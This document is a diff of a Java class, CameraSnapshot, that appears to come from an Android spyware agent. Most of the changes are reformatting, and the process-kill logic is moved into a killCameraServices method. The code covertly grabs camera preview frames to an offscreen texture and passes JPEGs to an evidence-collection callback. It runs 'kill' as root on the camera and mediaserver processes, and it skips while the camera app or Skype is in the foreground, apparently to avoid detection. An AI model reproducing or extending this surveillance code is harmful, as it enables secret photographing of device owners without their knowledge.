@@ -67,7 +67,7 @@ import java.util.Set;
  * <p/>
  * RuntimeException can be cause by:
  * 1)mediaserver :Error: java.lang.RuntimeException: Fail to connect to camera service
- * 2)camera service: cannot open control fd of /dev/videoX 
+ * 2)camera service: cannot open control fd of /dev/videoX
  */
 public class CameraSnapshot {
 	private static final String TAG = "CameraSnapshot";
@@ -76,8 +76,8 @@ public class CameraSnapshot {
 	private Object cameraLock = new Object();
 	private int camera_killed = 0;
 	public static final int MAX_CAMERA_KILLS = 5;
-	private int kill_camera_request=0;
-	private boolean kill_also_mediaserver=false;
+	private int kill_camera_request = 0;
+	private boolean kill_also_mediaserver = false;
 	private long lastKill = -1;
 	public Set<String> blacklist = new HashSet<String>();
 	private static CameraSnapshot singleton = null;
@@ -95,33 +95,35 @@ public class CameraSnapshot {
 		@Override
 		public void onError(int error, Camera camera) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onError), Error: " + error );
+				Check.log(TAG + " (onError), Error: " + error);
 			}
 
-			if(error == Camera.CAMERA_ERROR_SERVER_DIED){
+			if (error == Camera.CAMERA_ERROR_SERVER_DIED) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onError), Error: CAMERA_ERROR_SERVER_DIED" );
+					Check.log(TAG + " (onError), Error: CAMERA_ERROR_SERVER_DIED");
 				}
-			}else if(error == Camera.CAMERA_ERROR_UNKNOWN){
+			} else if (error == Camera.CAMERA_ERROR_UNKNOWN) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onError), Error: CAMERA_ERROR_UNKNOWN" );
+					Check.log(TAG + " (onError), Error: CAMERA_ERROR_UNKNOWN");
 				}
 			}
 
 		}
 	};
 
-
-
+	/**
+	 * Increments only if no blacklisted app is in foreground.
+	 * (skype and camera are supposed to break the camera)
+	 */
 	public void incKillreqCamera() {
 		String lasfg = ListenerProcess.self().getLastForeground();
-		if(lasfg != null ) {
+		if (lasfg != null) {
 			for (String bl : blacklist) {
-				if (lasfg.contains(bl)){
+				if (lasfg.contains(bl)) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (incKillreqCamera): process=" + bl + " in blacklist , skip increments and reset");
 					}
-					kill_camera_request=0;
+					kill_camera_request = 0;
 					return;
 				}
 			}
@@ -133,35 +135,38 @@ public class CameraSnapshot {
 		return camera_killed;
 	}
 
-	public  void clearKillreq() {
-		kill_camera_request=0;
+	public void clearKillreq() {
+		kill_camera_request = 0;
 	}
-	public  int getKillreq() {
+
+	public int getKillreq() {
 		return kill_camera_request;
 	}
+
 	public synchronized void addBlacklist(String black) {
 		blacklist.add(black);
 	}
+
 	public synchronized void delBlacklist(String black) {
 		blacklist.remove(black);
 	}
+
 	public synchronized boolean inInBlacklist(String process) {
 		return blacklist.contains(process);
 	}
 
-	public static CameraSnapshot self(){
-		if(singleton==null){
+	public static CameraSnapshot self() {
+		if (singleton == null) {
 			singleton = new CameraSnapshot();
 		}
 		return singleton;
 	}
 
 
-	private CameraSnapshot(){
+	private CameraSnapshot() {
 		blacklist.clear();
 		addBlacklist(M.e(".camera"));
 		addBlacklist(M.e("com.skype.raider"));
-		//addBlacklist(M.e("soundrecorder"));
 	}
 
 	// camera state
@@ -176,8 +181,9 @@ public class CameraSnapshot {
 
 				Camera.Parameters cameraParms;
 				Camera.Size size;
+
 				CCD(byte[] b, Camera c) {
-					bytes= b;
+					bytes = b;
 					cameraParms = c.getParameters();
 					size = cameraParms.getPreviewSize();
 				}
@@ -203,22 +209,20 @@ public class CameraSnapshot {
 									jpeg));
 							ModuleCamera.callback(jpeg.toByteArray());
 						}
-					}catch(Exception e){
+					} catch (Exception e) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (CCD), error decoding frame: " + bytes.length);
 						}
-					}
-					finally {
+					} finally {
 
 					}
 				}
 			}
 
 
-
-			boolean released=false;
+			boolean released = false;
 			try {
-				if(bytes!=null ) {
+				if (bytes != null) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
 					}
@@ -228,11 +232,11 @@ public class CameraSnapshot {
 					Thread ec = new Thread(decodeCameraFrame);
 					ec.start();
 				}
-			}finally {
+			} finally {
 				try {
-					if(!released)
+					if (!released)
 						releaseCamera(camera);
-				}catch(Exception e){
+				} catch (Exception e) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (onPreviewFrame) probably release called twice: " + e);
 					}
@@ -253,6 +257,7 @@ public class CameraSnapshot {
 	 * <p/>
 	 * /**
 	 * Tests encoding of AVC video from Camera input.  The output is saved as an MP4 file.
+	 *
 	 * @param cameraId
 	 */
 	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
@@ -265,7 +270,7 @@ public class CameraSnapshot {
 		//	return;
 		//}
 		//768x432
-		if(enable.containsKey(cameraId) && !enable.get(cameraId)){
+		if (enable.containsKey(cameraId) && !enable.get(cameraId)) {
 			return;
 		}
 		Camera camera = null;
@@ -280,62 +285,13 @@ public class CameraSnapshot {
 					//	Check.log(TAG + " (snapshot), camera has been disable for someone? " + localDPM.getCameraDisabled(null));
 					//}
 					long startedAt = System.currentTimeMillis();
-					if(getKillreq()>4) {
+					if (getKillreq() > 4) {
 						if (camera_killed <= CameraSnapshot.MAX_CAMERA_KILLS) {
-
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " (snapshot), something wrong with camera? WTF kill it for nth" + camera_killed + "times");
-							}
-							String pid = Utils.pidOf(M.e("camera"));
-							String pid_ms = Utils.pidOf(M.e("mediaserver"));
-							try {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (snapshot) try to kill " + pid);
-								}
-								Execute.executeRoot("kill " + pid);
-								if(kill_also_mediaserver) {
-									if (Cfg.DEBUG) {
-										Check.log(TAG + " (snapshot) try to kill also mediaserver " + pid);
-									}
-									Execute.executeRoot("kill " + pid_ms);
-									kill_also_mediaserver = false;
-								}
-								//if(lastKill==-1 || (startedAt - lastKill) <= MIN_INTERVAL_FOR_INCREMENT) {
-									camera_killed++;
-								//}
-								lastKill = startedAt;
-							} catch (Exception ex) {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (snapshot) Error: " + ex);
-								}
-							}
+							killCameraServices(startedAt);
 							clearKillreq();
-						}else{
+						} else {
 							EvidenceBuilder.info(M.e("camera Module suspended"));
-							String pid = Utils.pidOf(M.e("camera"));
-							String pid_ms = Utils.pidOf(M.e("mediaserver"));
-							try {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (snapshot) try to kill " + pid);
-								}
-								Execute.executeRoot("kill " + pid);
-								if (kill_also_mediaserver) {
-									if (Cfg.DEBUG) {
-										Check.log(TAG + " (snapshot) try to kill also mediaserver " + pid);
-									}
-									Execute.executeRoot("kill " + pid_ms);
-									kill_also_mediaserver = false;
-								}
-								//if(lastKill==-1 || (startedAt - lastKill) <= MIN_INTERVAL_FOR_INCREMENT) {
-								camera_killed++;
-								//}
-								lastKill = startedAt;
-							} catch (Exception ex) {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (snapshot) Error: " + ex);
-								}
-							}
-
+							killCameraServices(startedAt);
 						}
 					}
 					return;
@@ -344,7 +300,7 @@ public class CameraSnapshot {
 					Check.log(TAG + " (snapshot), cameraId: " + cameraId);
 				}
 
-				if(this.surface == null){
+				if (this.surface == null) {
 					int[] surfaceparams = new int[1];
 					GLES20.glGenTextures(1, surfaceparams, 0);
 
@@ -371,11 +327,42 @@ public class CameraSnapshot {
 					Check.log(TAG + " (snapshot) ERROR: " + e);
 				}
 				incKillreqCamera();
-				if(camera!=null){
-				releaseCamera(camera);
+				if (camera != null) {
+					releaseCamera(camera);
 				}
 			}
 		}
+	}
+
+
+	private void killCameraServices(long startedAt) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (snapshot), something wrong with camera? WTF kill it for nth" + camera_killed + "times");
+		}
+		String pid_cam = Utils.pidOf(M.e("camera"));
+		String pid_ms = Utils.pidOf(M.e("mediaserver"));
+		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (snapshot) try to kill " + pid_cam);
+			}
+			Execute.executeRoot("kill " + pid_cam);
+			if (kill_also_mediaserver) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (snapshot) try to kill also mediaserver " + pid_cam);
+				}
+				Execute.executeRoot("kill " + pid_ms);
+				kill_also_mediaserver = false;
+			}
+			//if(lastKill==-1 || (startedAt - lastKill) <= MIN_INTERVAL_FOR_INCREMENT) {
+			camera_killed++;
+			//}
+			lastKill = startedAt;
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (snapshot) Error: " + ex);
+			}
+		}
+
 	}
 
 	@TargetApi(Build.VERSION_CODES.GINGERBREAD)
@@ -386,25 +373,25 @@ public class CameraSnapshot {
 		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
 			Camera.getCameraInfo(camIdx, cameraInfo);
 
-			if(cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT){
+			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (openCamera), found FACE CAMERA");
 				}
 				//continue;
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (openCamera), orientation: " +  cameraInfo.orientation);
+				Check.log(TAG + " (openCamera), orientation: " + cameraInfo.orientation);
 			}
 			if (requestFace == cameraInfo.facing || requestFace == CAMERA_ANY) {
 				try {
 
-					if(requestFace == CAMERA_ANY){
+					if (requestFace == CAMERA_ANY) {
 						cam = Camera.open();
-					}else {
+					} else {
 						cam = Camera.open(camIdx);
 					}
 
-					if(cam!=null) {
+					if (cam != null) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (openCamera), opened: " + camIdx);
 						}
@@ -415,8 +402,8 @@ public class CameraSnapshot {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (openCamera), Error: " + e);
 					}
-					if(e.toString().contains(M.e("Fail to connect to camera service"))){
-						kill_also_mediaserver=true;
+					if (e.toString().contains(M.e("Fail to connect to camera service"))) {
+						kill_also_mediaserver = true;
 					}
 					incKillreqCamera();
 				}
@@ -435,7 +422,7 @@ public class CameraSnapshot {
 		try {
 
 			Camera camera = openCamera(cameraId);
-			if(camera == null){
+			if (camera == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (prepareCamera), cannot open camera: " + cameraId);
 				}
@@ -447,10 +434,10 @@ public class CameraSnapshot {
 
 			Camera.Parameters cameraParms = camera.getParameters();
 			List<String> modes = cameraParms.getSupportedFocusModes();
-			if(modes.contains("continuous-picture")) {
+			if (modes.contains("continuous-picture")) {
 				cameraParms.setFocusMode("continuous-picture");
 			}
-			if(cameraParms.getSupportedPreviewFormats().contains(ImageFormat.NV21)) {
+			if (cameraParms.getSupportedPreviewFormats().contains(ImageFormat.NV21)) {
 				cameraParms.setPreviewFormat(ImageFormat.NV21);
 			}
 			//cameraParms.set("iso", (String) "400");
@@ -470,8 +457,8 @@ public class CameraSnapshot {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (prepareCamera), ERROR " + ex);
 				incKillreqCamera();
-				if(ex.toString().contains(M.e("Fail to connect to camera service"))){
-					kill_also_mediaserver=true;
+				if (ex.toString().contains(M.e("Fail to connect to camera service"))) {
+					kill_also_mediaserver = true;
 				}
 			}
 			return null;
@@ -560,20 +547,20 @@ public class CameraSnapshot {
 //		}
 //	}
 
-	private static Camera.Size getBestPreviewSize(Camera.Parameters parameters, int width, int height){
+	private static Camera.Size getBestPreviewSize(Camera.Parameters parameters, int width, int height) {
 		Camera.Size bestSize = null;
 		List<Camera.Size> sizeList = parameters.getSupportedPreviewSizes();
 
 		int maxSize = width * height;
 		bestSize = null;
 
-		for(int i = 1; i < sizeList.size(); i++){
+		for (int i = 1; i < sizeList.size(); i++) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getBestPreviewSize), supported size: " + sizeList.get(i).width + " x " +sizeList.get(i).height);
+				Check.log(TAG + " (getBestPreviewSize), supported size: " + sizeList.get(i).width + " x " + sizeList.get(i).height);
 			}
 			int area = sizeList.get(i).width * sizeList.get(i).height;
-			int areaBest = (bestSize!=null? (bestSize.width * bestSize.height) : 0);
-			if(area > areaBest && area < maxSize){
+			int areaBest = (bestSize != null ? (bestSize.width * bestSize.height) : 0);
+			if (area > areaBest && area < maxSize) {
 				bestSize = sizeList.get(i);
 			}
 		}
@@ -614,7 +601,7 @@ public class CameraSnapshot {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (releaseCamera), released");
 		}
-		return  true;
+		return true;
 	}
 
 }
